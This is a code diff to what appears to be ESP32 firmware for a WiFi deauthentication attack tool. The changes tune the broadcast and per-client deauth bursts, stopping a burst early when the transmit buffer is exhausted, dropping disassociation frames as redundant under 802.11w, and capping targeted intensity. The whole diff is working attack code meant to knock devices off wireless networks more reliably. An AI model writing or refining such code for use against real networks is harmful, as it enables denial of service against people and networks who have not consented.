@@ -53,7 +53,16 @@ static void timer_send_deauth_frame(void *arg) {
     }
 
     for (uint8_t i = 0; i < deauth_burst; i++) {
-        wsl_bypasser_send_deauth_frame(ap);
+        /* At high intensity (esp. with several targets, each on its own
+         * independent 100ms timer that can all land in the same tick),
+         * firing frames back-to-back with zero pacing can outrun the WiFi
+         * driver's TX buffer pool — esp_wifi_80211_tx() starts failing with
+         * ESP_ERR_NO_MEM, and every further call in this burst would just
+         * fail too (the pool won't free up mid-loop). Stop this burst early
+         * instead of wasting cycles on N more guaranteed failures; the next
+         * tick gets a fresh attempt once earlier frames have actually gone
+         * out and freed their buffers. */
+        if (wsl_bypasser_send_deauth_frame(ap) != ESP_OK) break;
     }
 }
 
@@ -266,7 +275,7 @@ static void tgt_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
 }
 
 /* Periodic sender: on each tick operate on one channel, blasting the targets that
- * live there — directed deauth+disassoc per known client, plus a broadcast deauth. */
+ * live there — directed deauth per known client, plus a broadcast deauth. */
 static void tgt_tick(void *arg) {
     if (!tgt_running || tgt_channel_count == 0) return;
 
@@ -279,14 +288,22 @@ static void tgt_tick(void *arg) {
         if (ap->primary != ch) continue;
 
         for (uint8_t b = 0; b < tgt_intensity; b++) {
-            wsl_bypasser_send_deauth_frame(ap);            /* broadcast fallback */
+            /* Same TX-buffer-pool exhaustion risk as timer_send_deauth_frame()
+             * — here it's worse, since every discovered client multiplies the
+             * frame count for the same nominal intensity (see
+             * TARGETED_INTENSITY_MAX). Stop this AP's broadcast fallback burst
+             * early on a failed send rather than guarantee more failures. */
+            if (wsl_bypasser_send_deauth_frame(ap) != ESP_OK) break;
         }
 
         for (int c = 0; c < tgt_client_count; c++) {
             if (memcmp(tgt_clients[c].bssid, ap->bssid, 6) != 0) continue;
+            /* Deauth only, not deauth+disassoc — 802.11w (Management Frame
+             * Protection) protects both frame types identically, so sending
+             * both bought nothing against a PMF-capable client while
+             * doubling airtime/buffer load against every other one. */
             for (uint8_t b = 0; b < tgt_intensity; b++) {
-                wsl_bypasser_send_deauth_targeted(ap->bssid, tgt_clients[c].mac);
-                wsl_bypasser_send_disassociation_frame(ap->bssid, tgt_clients[c].mac);
+                if (wsl_bypasser_send_deauth_targeted(ap->bssid, tgt_clients[c].mac) != ESP_OK) break;
             }
         }
     }
@@ -302,7 +319,7 @@ void attack_method_targeted_start(const wifi_ap_record_t **records, uint8_t coun
     tgt_client_count = 0;
 
     if (intensity < 1) intensity = 1;
-    if (intensity > DEAUTH_INTENSITY_MAX) intensity = DEAUTH_INTENSITY_MAX;
+    if (intensity > TARGETED_INTENSITY_MAX) intensity = TARGETED_INTENSITY_MAX;
     tgt_intensity = intensity;
 
     for (int i = 0; i < count && i < MAX_ATTACK_TARGETS; i++) {
